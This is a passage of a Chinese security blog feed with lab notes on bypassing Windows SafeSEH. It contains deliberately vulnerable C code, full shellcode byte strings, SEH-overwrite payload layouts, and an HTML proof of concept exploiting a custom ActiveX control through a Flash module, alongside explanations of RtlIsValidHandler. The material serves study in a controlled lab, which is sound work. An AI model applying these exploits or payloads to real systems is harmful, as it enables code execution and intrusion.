<li>使用SEH_NOSafeSEH_JUMP.DLL中的&quot;pop pop retn&quot;指令地址覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理。通过劫持异常处理流程，程序转入SEH_NOSafeSEH_JUMP.DLL中执行&quot;pop pop retn&quot;指令，在执行retn后程序转入shellcode执行。</li>
</ol>
<p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td>DEP关闭</td>
</tr>
<tr>
<td>EXE编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>DLL编译器</td>
<td>VC++ 6.0</td>
<td>将dll基址设为0x11120000</td>
</tr>
<tr>
<td>编译选项</td>
<td><font color="#f00">禁用优化选项</font></td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
<p><b>编译DLL</b></p>
<ol>
<li>在VC++ 6.0新建“Win32 Dynamic-Link Library”工程，创建一个<font color="#f00">简单的DLL工程</font></li>
<li>按照实验代码编写对应的cpp文件</li>
<li>由于VC++ 6.0默认编译的DLL文件加载地址为0x10000000，如果其作为DLL加载地址可能会包含0x00，这会导致strcpy字符串截断，所以为方便测试，需要重新设置基址。&quot;工程-&gt;设置-&gt;连接选显卡&quot;，在&quot;工程选项&quot;输入框中添加&quot;/base:&quot;0x11120000&quot;&quot;<br><img src="/images/2017-07-08/dll_setting.jpg" alt="编译DLL的图"></li>
</ol>
<p><b>OllySSEH插件说明</b><br>对于SafeSEH描述分为以下四种，如图所示</p>
<ol>
<li>/SafeSEH OFF: 未启用SafeSEH，这种模式可作为跳板</li>
<li>/SafeSEH ON：启用SafeSEH，可以使用右键点击查看SEH注册情况</li>
<li>NO SEH：不支持SafeSEH，即IMAGE_DLLCHARACTERISTICS_NO_SEH标志位被设置，模块内的异常会被忽略，所以不能作为跳板</li>
<li>Erro：读取错误</li>
</ol>
<p><img src="/images/2017-07-08/ollysseh.jpg" alt="ollysseh描述图"></p>
<p><b>后续操作</b></p>
<ol>
<li>在SEH_NOSafeSEH_JUMP.DLL中找到&quot;pop pop retn&quot;序列。非常蛋疼的是明明在dll文件中写入一个函数&quot;pop eax, pop eax, retn&quot;，但是在编译的时候就找不到了。不过dll文件中存在&quot;pop ecx, pop ecx, retn&quot;这样原始序列，我们也可以拿来使用，位置为0x111221F1</li>
<li>溢出字符串起始位置0x0012FDB8<br>最近的异常处理函数句柄0x0012FE90+4</li>
<li>VS 2008编译的程序，在进入含有\_\<em>try{}的函数时会在Security Cookie+4的位置压入-2（VC++ 6.0下为-1），在程序进入\</em>\<em>try{}区域时程序会根据该\</em>\<em>try{}块在函数中的位置而修改成不同的值（第一层try会将这个值修改为0， 第二层会将这个值修改1）。如果\</em>\<em>try{}块中出现异常，程序会根据这个值调用相应的\</em>\<em>except()处理，处理结束后这个位置的值会重新修改为-2；如果每发生异常，程序会在离开\</em>\_try{}块时这个值也会被修改回-2。</li>
<li>由于上面的操作，如果将shellcode放在前面的话可能会对弹出对话框的造成破坏，所以将弹出对话框的机器码放在了最后</li>
</ol>
<p><br><br><b>shellcode组成</b></p>
<ol>
<li>220 * &quot;\x90&quot;</li>
<li>&quot;pop pop retn&quot;地址0x111221F1</li>
<li>16 * &quot;\x90&quot;</li>
<li>168字节的弹出对话框机器码<br><br></li>
</ol>
<h4 id="4-3-验证及其思考"><a href="#4-3-验证及其思考" class="headerlink" title="4.3 验证及其思考"></a>4.3 验证及其思考</h4><p><br><br>由于用上面的shellcode无法正常出现弹框，所以我花了半天时间来解决这中间的问题！</p>
<p><b><font color="#f00">Ollydbg如何调试SEH？</font></b><font color="#0f0"></font></p>
<ol>
<li>首先程序运行到出错的汇编代码处，然后两次&quot;Shift+F7&quot;进入错误判断程序</li>
<li>然后通过SEH Chain窗口，获取离栈顶最近的SEH，双击跳转至该地址，&quot;F2&quot;设置断点</li>
<li>最后直接&quot;F9&quot;跳转至该位置<br></li>
</ol>
<p><img src="/images/2017-07-08/seh1.jpg" alt="第一次SEH处理句柄"></p>
<p><b><font color="#f00">&quot;pop pop retn&quot;作为异常处理函数所做的工作</font></b><font color="#0f0"></font></p>
<ol>
<li>首先，弹出异常判断回去的指针</li>
<li>然后弹出原始栈顶中的一位参数</li>
<li>最后返回离栈顶最近的SEH的链表指针所在地址(而不是函数处理句柄)【有时候由于没有中间的参数，而导致返回的是函数处理句柄】<br></li>
</ol>
<p><img src="/images/2017-07-08/seh2.jpg" alt="进入shellcode"></p>
<p>从上面的图片可以看出，2112被解析成&quot;AND DWORD PTR DS:[EDX],EDX&quot;，而EDX是不能被修改的，所以出错，后面的指令也陆续发生错误！</p>
<p><font color="#f00">解决办法：修改SEH链表指针&quot;\x90\x90\x90\x90&quot;。</font></p>
<p><font color="#f00">本人尝试了很多办法，最后使用的将0x111221F1作为push的参数压入栈中</font><br><img src="/images/2017-07-08/seh3.jpg" alt="修改后的结果"></p>
<p>紧接着的数据本来是&quot;\x90\x90\x90\x90&quot;，但是可能中间的某些操作导致该数据被修改为0000，可以使用同样的办法，将其压入栈中</p>
<p><b>最终的shellcode组成</b></p>
<ol>
<li>219 * &quot;\x90&quot; + &quot;\x68&quot;</li>
<li>&quot;pop pop retn&quot;地址0x111221F1</li>
<li>3 * &quot;\x90&quot; + &quot;\x68&quot; + 12 * &quot;\x90&quot;</li>
<li>168字节的弹出对话框机器码</li>
</ol>
<p><br></p>
<h3 id="5-利用加载模块之外的地址绕过SafeSEH"><a href="#5-利用加载模块之外的地址绕过SafeSEH" class="headerlink" title="5. 利用加载模块之外的地址绕过SafeSEH"></a>5. 利用加载模块之外的地址绕过SafeSEH</h3><p><br><br>OllyDbg调试时，用&quot;view-&gt;memory&quot;可以查看程序的映射状态。类型为&quot;Map&quot;的映射文件，SafeSEH是无视的。当异常处理函数指针指向这些地址范围内时，是不对其进行有效性验证的。如果可以在这些文件中找到跳板指令，就可以绕过SafeSEH。</p>
<pre><code>
其实除了"pop pop retn"指令序列外，一下指令也可以使用：
call/jmp dword ptr [esp+0x8]
call/jmp dword ptr [esp+0x14]
call/jmp dword ptr [esp+0x1c]
call/jmp dword ptr [esp+0x2c]
call/jmp dword ptr [esp+0x44]
call/jmp dword ptr [esp+0x50]
call/jmp dword ptr [ebp+0xc]
call/jmp dword ptr [ebp+0x24]
call/jmp dword ptr [ebp+0x30]
call/jmp dword ptr [ebp-0x4]
call/jmp dword ptr [ebp-0xc]
call/jmp dword ptr [ebp-0x18]

</code></pre>

<h4 id="5-1-实验代码"><a href="#5-1-实验代码" class="headerlink" title="5.1 实验代码"></a>5.1 实验代码</h4><pre><code>
#include "stdafx.h"
#include "string.h"
#include "windows.h"

char shellcode[] = 
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xE9\x2B\xFF\xFF\xFF\x90\x90\x90"
    "\xEB\xF6\x90\x90"
    "\x0B\x0B\x28\x00";

DWORD MyException(void)
{
    printf("There is an exception");
    getchar();
    return 1;
}

void test(char * input)
{
    char str[200];
    strcpy(str, input);
    int zero=0;
    __try
    {
        zero = 1/zero;
    }
    __except(MyException()){}
}

int _tmain(int argc, _TCHAR* argv[])
{
    //__asm int 3
    test(shellcode);
    return 0;
}

</code></pre>

<h4 id="5-2-实验内容"><a href="#5-2-实验内容" class="headerlink" title="5.2 实验内容"></a>5.2 实验内容</h4><p><b>实验思路：</b></p>
<ol>
<li>Test函数存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH</li>
<li>该程序中所有加载模块都启用了SafeSEH机制，故不能通过未启用SafeSEH的模块来绕过SafeSEH</li>
<li>将异常处理函数指针覆盖为加载模块外的地址来实现对SafeSEH的绕过，然后通过除0触发异常程序转入异常处理，进而劫持程序流程。</li>
</ol>
<p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td>DEP关闭</td>
</tr>
<tr>
<td>编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td><font color="#f00">禁用优化选项</font></td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
<p><b>实验内容：</b></p>
<ol>
<li>获取数据：(溢出字符串起始位置0x0012FE88)<br>(距离栈顶最近的异常处理函数句柄0x0012FF60+4)</li>
<li>使用OllyDbg插件OllyFindAddr，可以在整个程序的内存空间搜索。本实验使用call/jmp dword ptr[ebp+n]指令作为跳板。&quot;Plugins-&gt;OllyFindAddr-&gt;Overflow return address-&gt;Find CALL/JMP [EBP+N]&quot;来进行指令的搜索。</li>
<li>在0x00280B0B中找到了call [ebp+x030]的指令(但是0x00会被截断，如果是Unicode漏洞就不用考虑这个问题，因为Unicode的结束符号为0x0000)</li>
<li>使用两段跳的方式跳至shellcode起始处执行<ul>
<li>通过一个2字节的短跳指令0xEBF6向回跳8个字节</li>
<li>在这8个字节中布置一条5字节的长跳转指令完成最终的回跳<br><img src="/images/2017-07-08/map_call.jpg" alt="搜索跳板的结果"></li>
</ul>
</li>
</ol>
<p><b>shellcode组成：</b></p>
<ol>
<li>168字节的弹出对话框机器码</li>
<li>40 * &quot;\x90&quot;</li>
<li>长跳指令和0x90填充 &quot;\xE9\x2B\xFF\xFF\xFF\x90\x90\x90&quot;</li>
<li>短跳转指令和0x90填充 &quot;\xEB\xF6\x90\x90&quot;</li>
<li>跳板指令&quot;\x0B\x0B\x28\x00&quot;</li>
</ol>
<p><br></p>
<h4 id="5-3-验证及其思考"><a href="#5-3-验证及其思考" class="headerlink" title="5.3 验证及其思考"></a>5.3 验证及其思考</h4><p><br><br>由于一开始无法在0x00280B0B处设置断点，所以无法进入去查看,后来使用Animate into之后，能够在0x00280B0B处停止，方便我们调试。进入之后发现跳转指令直接跳转至SEH的链表指针所在地址，这就有我们 前面讲的shellcode来源。</p>
<h3 id="6-利用Adobe-Flash-Player-ActiveX控件绕过SafeSEH"><a href="#6-利用Adobe-Flash-Player-ActiveX控件绕过SafeSEH" class="headerlink" title="6. 利用Adobe Flash Player ActiveX控件绕过SafeSEH"></a>6. 利用Adobe Flash Player ActiveX控件绕过SafeSEH</h3><p>该方法就是利用未启用SafeSEH模块绕过SafeSEH的浏览器版。Flash Player ActiveX在9.2.124之前的版本不支持SafeSEH，所以若我们能够在这个控件中找到合适的跳板地址，就可以绕过SafeSEH。</p>
<h4 id="6-1-绕过SafeSEH需要三方面的支持"><a href="#6-1-绕过SafeSEH需要三方面的支持" class="headerlink" title="6.1 绕过SafeSEH需要三方面的支持"></a>6.1 绕过SafeSEH需要三方面的支持</h4><ol>
<li>具有溢出漏洞的ActiveX控件</li>
<li>未启用SafeSEH的Flash Player ActiveX控件</li>
<li>可以触发ActiveX控件中溢出漏洞的POC页面</li>
</ol>
<h4 id="6-2-基于MFC的ActiveX控件"><a href="#6-2-基于MFC的ActiveX控件" class="headerlink" title="6.2 基于MFC的ActiveX控件"></a>6.2 基于MFC的ActiveX控件</h4><p>建立好控件工程后，使用类视图中的&quot;VulnerAX_SEHLib-&gt;DVulnerAX-&gt;Add-&gt;Add Method&quot;，添加一个可以在Web页面中调用的接口函数，函数返回类型为void，函数名为test，参数类型为BSTR，参数名为str</p>
<p>VulnerAX_SEHCtrl.cpp中的test函数</p>
<pre><code>
DWORD MyException(void)
{
    printf("There is an exception");
    getchar();
    return 1;
}

// CVulnerAX_SEHCtrl message handlers

void CVulnerAX_SEHCtrl::test(LPCTSTR str)
{
    //AFX_MANAGE_STATE(AfxGetStaticModuleState());
    // TODO: Add your dispatch handler code here
    printf("aaaa");        //定位该函数的标记
    char dest[100];
    sprintf(dest, "%s", str);
    int zero = 0;
    __try
    {
        zero = 1/zero;
    }
    __except(MyException())
    {
    }
}

</code></pre>

<p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td></td>
</tr>
<tr>
<td>编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>优化</td>
<td><font color="#f00">禁用优化选项</font></td>
<td></td>
</tr>
<tr>
<td>MFC</td>
<td>在静态库中使用MFC</td>
<td>工程属性-&gt;General-&gt;Use of MFC</td>
</tr>
<tr>
<td>字符集</td>
<td>使用Unicode字符集</td>
<td>工程属性-&gt;General-&gt;Character Set</td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
<p>编译好控件之后，在实验机器上注册该ActiveX控件.regsvr32</p>
<h4 id="6-3-POC"><a href="#6-3-POC" class="headerlink" title="6.3 POC"></a>6.3 POC</h4><pre><code>
&lt;html&gt;
&lt;body&gt;
&lt;embed src="map.swf" quality="high" type="application/x-shockwave-flash" width="160"
height="260"&gt;&lt;/embed&gt;
&lt;object classid="clsid:F010E769-5E95-4DBB-943D-AF2D1FE10C34" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while (s.length &lt; 60) {
    s += "\u9090";
}
s += "\u0EEB\u9090";
s += "\uA0C6\u021D";
s += "\u9090\u9090\u9090\u9090";
s += "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
test.test(s);
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>这个代码和书上的不一致，但是完全正确。需要注意的是，我们使用的embed中的map.swf需要和该html在同一文件夹下，而object中的classid其实可以从VulnerAX_SEH.idl中找到。注意只能是下面代码中那处显示的uuid，其它位置处的都不行！！！</p>
<pre><code>
    //  Class information for CVulnerAX_SEHCtrl

    [ uuid(F010E769-5E95-4DBB-943D-AF2D1FE10C34),
      helpstring("VulnerAX_SEH Control"), control ]
    coclass VulnerAX_SEH
    {
        [default] dispinterface _DVulnerAX_SEH;
        [default, source] dispinterface _DVulnerAX_SEHEvents;
    };
</code></pre>

<h4 id="6-5-实验内容"><a href="#6-5-实验内容" class="headerlink" title="6.5 实验内容"></a>6.5 实验内容</h4><p><b>实验思路：</b></p>
<ol>
<li>在POC页面中随便插入一个Flash，让浏览器能够加载Flash控件</li>
<li>在POC页面中调用VulnerAX_SEH.ocx控件中的test函数，并向其传递超长字符串，以触发test函数中的溢出漏洞。</li>
<li>通过溢出手段将VulnerAX_SEH.ocx中的异常处理函数地址覆盖为Flash控件中的跳转地址。由于Flash控件没有启用SafeSEH，所以这个跳板地址可以绕过SafeSEH</li>
<li>Test函数触发除0异常后，程序会去调用异常处理函数，由于异常处理函数地址已经被覆盖，所以劫持了程序流程。</li>
</ol>
<p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td></td>
</tr>
<tr>
<td>浏览器</td>
<td>Internet Explorer 6</td>
<td></td>
</tr>
<tr>
<td>Flash控件版本</td>
<td>9.0.115.0</td>
<td>未启用SafeSEH的最后一版9.2.124</td>
</tr>
</tbody>
</table>
<p><b>实验步骤：</b></p>
<ol>
<li>修改POC，将s设置为90字节的0x90，用IE访问POC页面。</li>
<li>如果浏览器提示ActiveX控件被拦截等信息请自行设置浏览器权限，当浏览器弹出下图所示对话框，就可以用Ollydbg附加IE的进程<font color="#f00">（打开Ollydbg，点击File-&gt;attach，找到IExplorer进程，attach上去即可）</font>，附加好后按F9让程序继续运行<br><img src="/images/2017-07-08/activex.jpg" alt="ActiveX提示"></li>
<li>找到VulnerAX_SEH.ocx的内存空间，查找字符串&quot;aaaa&quot;，在此位置设置好断点0x100017DC<font color="#f00">（这是最近两天才发现的，设置断点一定要在CPU主界面设置，否则就设置不成功！）</font>。我的方法如下图:先在Memory窗口中找到VulnerAX_SEH所在位置，然后搜索字符串&quot;aaaa&quot;，在rdata中找到了字符串，记下地址0x1003F9F8，再在.text中找字符串&quot;\xF8\xF9\x03\x10&quot;，就可以找到printf(&quot;aaaa&quot;)的位置<br><img src="/images/2017-07-08/breakpoint_printf_aaaa.jpg" alt="查找函数的方法"></li>
<li>点击浏览器对话框中的&quot;是&quot;按钮，程序会中断在我们设置好的断点位置</li>
<li>单步执行完sprintf(0x100017F9)之后，得到数据：溢出字符串的起始位置0x0012E014；离栈顶最近的异常处理函数句柄在0x0012E08C+4。故需填充124(0x7C)个字节就可以覆盖到异常处理函数地址。</li>
<li>在Flash控件中搜索跳板指令。<font color="#f00">通过OllySEEH找到/SafeSEH OFF区域，如图所示。</font>然后使用OllyFindAddr插件的Find CALL/JMP [EBP+N]选项来查找，最后在flash.ocx中找到了多条跳板。如图所示：我们使用0x021DA0C6处的CALL [EBP-0x18]作为跳板<font color="#f00">（不知道怎么回事，有些跳板地址用不了，当你输入0x02187625，但是进入函数之后跳板地址就变为了0x02137625）</font><br><img src="/images/2017-07-08/safeseh.jpg" alt="SafeSEH展示"><br><img src="/images/2017-07-08/call_jmp.jpg" alt="跳板指令"></li>
<li>程序执行跳板指令后，会回到SEH的链表指针所在地址。即&quot;\u9090\u9090\uA0C6\u021D&quot;处。</li>
</ol>
<p><b>shellcode组成：</b></p>
<ol>
<li>120字节0x90   60 * &quot;\u9090&quot;</li>
<li>向后短跳16字节 &quot;\u0EEB\u9090&quot;</li>
<li>Flash控件的跳板指令地址 &quot;\uA0C6\u021D&quot;</li>
<li>8字节的0x90填充    &quot;\u9090\u9090\u9090\u9090&quot;</li>
<li>168字节的弹出对话框机器码<br>&quot;\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3<br>\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08<br>\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd<br>\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c<br>\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38<br>\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857&quot;</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> SEH </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SafeSEH的保护原理以及攻击方法]]></title>
      <url>/2017/07/07/SafeSEH%E7%9A%84%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-启用SafeSEH"><a href="#1-启用SafeSEH" class="headerlink" title="1. 启用SafeSEH"></a>1. 启用SafeSEH</h3><p>通过启用/SafeSEH链接选项可以让编译好的程序具备SafeSEH功能</p>
<p>VS命令提示行，通过执行&quot;dumpbin /loadconfig 文件名&quot;就可以查看程序安全SEH表的情况。</p>
<p>可以通过&quot;程序-&gt;Microsoft Visual Studio 2008-&gt;Visual Studio Tools-&gt;Visual Studio 2008 Command Prompt&quot;启用</p>
<p>具有SafeSEH编译能力的VS 2008在编译程序时将程序中的异常处理函数的地址提取出来放到安全SEH表中</p>
<h3 id="2-SafeSEH的保护措施"><a href="#2-SafeSEH的保护措施" class="headerlink" title="2. SafeSEH的保护措施"></a>2. SafeSEH的保护措施</h3><ol>
<li>检查异常处理链是否位于当前程序的栈中，如果不在当前栈中，程序将终止异常处理函数的调用</li>
<li>检查异常处理函数指针是否指向当前程序的栈中。如果指向当前栈中，程序将终止异常处理函数的调用</li>
<li>在前面两项检查之后，程序调用全新的函数RtlIsValidHandler()，来对异常处理函数的有效性进行检验。</li>
</ol>
<ul>
<li>首先该函数判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，检校函数将依次进行如下判断：<ol>
<li>判断程序设置IMAGE_DLLCHARACTERISTICS_NO_SEH标识。设置了，异常就忽略，函数返回校验失败。</li>
<li>检测程序是否包含SEH表。如果包含，则将当前异常处理函数地址与该表进行匹配，匹配成功返回校验成功，否则失败。</li>
<li>判断 程序是否设置ILonly标识。设置了，标识程序只包含.NET编译人中间语言，函数直接返回校验失败</li>
<li>判断异常处理函数是否位于不可执行页（non-executable page）上。若位于，校验函数将检测DEP是否开启，如若系统未开启DEP则返回校验成功；否则程序抛出访问违例的异常</li>
</ol>
</li>
<li>如果异常处理函数的地址没有包含在加载模块的内存空间。校验函数将直接执行DEP相关检测，函数将依次进行如下检验：<ol>
<li>判断异常处理函数是否位于不可执行页（non-executable page）上。若位于，校验函数将检测DEP是否开启，如若系统未开启DEP则返回校验成功；否则程序抛出访问违例的异常</li>
<li>判断系统是否允许跳转到加载模块的内存空间外执行，如允许则返回校验成功；否则返回校验失败</li>
</ol>
</li>
</ul>
<p><img src="/images/2017-07-07/RtlIsValidHandler.jpg" alt="RtlIsValidHandler校验流程"></p>
<p>RtlIsValidHandler()函数的伪代码如下：</p>
<pre><code>
BOOL RtlIsValidHandler(handler)
{
    if (handler is in image){    //在加载模块内存空间内
        if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag ser)
            return FALSE;
        if (image has a SafeSEH table)     //含有安全SEH表，说明程序启用SafeSEH
            if (handler found in the table)    // 异常处理函数地址出现在安全SEH表中
                return TRUE;
            else    // 异常处理函数未出现在安全SEH表中
                return FALSE;
        if (image is a .NET assembly with the ILonly flag set)     //只包含IL
            return FALSE;
    }
    if (handler is on a non-executable page){    // 跑到不可执行页上
        if (ExecuteDispatchEnable bit set in the process flags)    //DEP关闭
            return TRUE;
        else
            raise ACESS_VIOLATION; //抛出访问违例异常
    }
    if (handler is not in an image){    // 在加载模块内存之外，并且在可执行页上
        if (ImageDispatchEnable bit set in the process flags)    // 允许在加载模块内存空间外执行
            return TRUE;
        else
            return FALSE;
    }
    return TRUE;    //前面所有条件都满足就允许这个异常处理函数执行
}
</code></pre>

<h3 id="3-SafeSEH不能解决的问题"><a href="#3-SafeSEH不能解决的问题" class="headerlink" title="3. SafeSEH不能解决的问题"></a>3. SafeSEH不能解决的问题</h3><ol>
<li>异常处理函数位于加载模块内存范围之外，DEP关闭</li>
<li>异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH(安全SEH表为空)，同时相应模块不是纯IL</li>
<li>异常处理函数位于加载模块范围之内，相应模块启用SafeSEH（安全SEH表不为空），异常处理函数地址包含在安全SEH表中</li>
</ol>
<p>分析三种情况的可行性：</p>
<ol>
<li>只考虑SafeSEH，不考虑DEP干扰，需要在加载模块内存范围之外找到一个跳板指令就可以转入shellcode中执行</li>
<li>第二种情况中，我们可以利用未启用SafeSEH模块中的指令作为跳板，转入shellcode执行。这也是一再强调SafeSEH需要操作系统与编译器的双重支持。在加载模块中找到一个未启用SafeSEH模块不是很难</li>
<li>第三种情况下，可以考虑：a)清空安全SEH表，造成该模块未启用SafeSEH假象；b)将指令注册到安全SEH表中。由于安全SEH表的信息在内存中加密存放，所以突破它的可能性不大，放弃！！</li>
</ol>
<p>另外突破SafeSEH的方法</p>
<ol>
<li>不攻击SEH。使用覆盖返回地址或者虚函数表等信息</li>
<li>利用SEH的安全校验的严重缺陷——如果SEH中的异常函数指针指向堆区，即使安全校验发现SEH不可信，仍会调用其已修改过的异常处理函数。</li>
</ol>
<h3 id="4-名词解释"><a href="#4-名词解释" class="headerlink" title="4. 名词解释"></a>4. 名词解释</h3><h4 id="4-1-DEP"><a href="#4-1-DEP" class="headerlink" title="4.1 DEP"></a>4.1 DEP</h4><p>DEP 数据执行保护 (Data Execution Prevention)。数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。在 Microsoft Windows XP Service Pack 2及以上版本的Windows中，由硬件和软件一起强制实施 DEP。</p>
<p>启用方法：<br>修改C:\boot.ini<br>默认为: /noexecute=option /fastdetect        //启用DEP<br>修改为：/execute=option /fastdetect           //关闭DEP</p>
<h4 id="4-2-IL"><a href="#4-2-IL" class="headerlink" title="4.2 IL"></a>4.2 IL</h4><p>IL可以指Intermediate Language，同MSIL(Microsoft Intermediate Language),是将.NET代码转化为机器语言的一个中间语言的缩写。</p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> SEH </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[汇编中常见指令解释]]></title>
      <url>/2017/07/06/%E6%B1%87%E7%BC%96%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4%E8%A7%A3%E9%87%8A/</url>
      <content type="html"><![CDATA[<font color="#f00">这篇博文很有趣，竟然将hexo的content设置给冲垮了，感觉里面写了不可思议的东西，十分值得我去深挖！！！</font>

<p><br></p>
<h3 id="1-pop-和-push"><a href="#1-pop-和-push" class="headerlink" title="1. pop 和 push"></a>1. pop 和 push</h3><p>常见的汇编指令源码</p>
<table>
<thead>
<tr>
<th>pop机器码</th>
<th>含义</th>
<th>push机器码</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>5f</td>
<td>pop edi</td>
<td>57</td>
<td>push edi</td>
</tr>
<tr>
<td>5e</td>
<td>pop esi</td>
<td>56</td>
<td>push esi</td>
</tr>
<tr>
<td>5d</td>
<td>pop ebp</td>
<td>55</td>
<td>push ebp</td>
</tr>
<tr>
<td>5c</td>
<td>pop esp</td>
<td>54</td>
<td>push esp</td>
</tr>
<tr>
<td>5b</td>
<td>pop ebx</td>
<td>53</td>
<td>push ebx</td>
</tr>
<tr>
<td>5a</td>
<td>pop edx</td>
<td>52</td>
<td>push edx</td>
</tr>
<tr>
<td>59</td>
<td>pop ecx</td>
<td>51</td>
<td>push ecx</td>
</tr>
<tr>
<td>58</td>
<td>pop eax</td>
<td>50</td>
<td>push eax</td>
</tr>
</tbody>
</table>
<h3 id="2-call"><a href="#2-call" class="headerlink" title="2. call"></a>2. call</h3><pre><code>
call (short) eax
1.将当前指令的下一条指令的地址压入栈中；
2.JMP到EAX这个地址。
</code></pre>

<pre><code>
call (long) eax
1.将CS压入栈中；
2.将当前指令的下一条指令的地址压入栈中；
2.JMP到EAX这个地址。
</code></pre>

<h3 id="3-retn-和-retf"><a href="#3-retn-和-retf" class="headerlink" title="3. retn 和 retf"></a>3. retn 和 retf</h3><pre><code>
retn
1.将当前的ESP中指向的地址出栈；
2.JMP到这个地址。
</code></pre>

<pre><code>
retn k
1.将当前的ESP中指向的地址出栈；
2.JMP到这个地址；
3.弹出栈顶的k个字节的数据
</code></pre>

<pre><code>
retf
1.将当前的ESP中指向的地址出栈给EIP；
2.将当前的ESP中指向的地址出栈给CS；
2.JMP到这个地址。
</code></pre>

<h3 id="4-jmp"><a href="#4-jmp" class="headerlink" title="4. jmp"></a>4. jmp</h3><pre><code>
<font color="#f00">jmp短跳</font>
\xeb\xf6:     jmp short $-8（其中$指代当前EIP）

在Asm2MachineCode(x86)中如果要尝试jmp short $-8，是不可能实现的，但是我们可以：
1. ImageBase（hex）设置为0012ff60 <font color="#f00">(此处为当前的EIP地址)</font>
2. jmp short 0012FF58
  </code></pre>

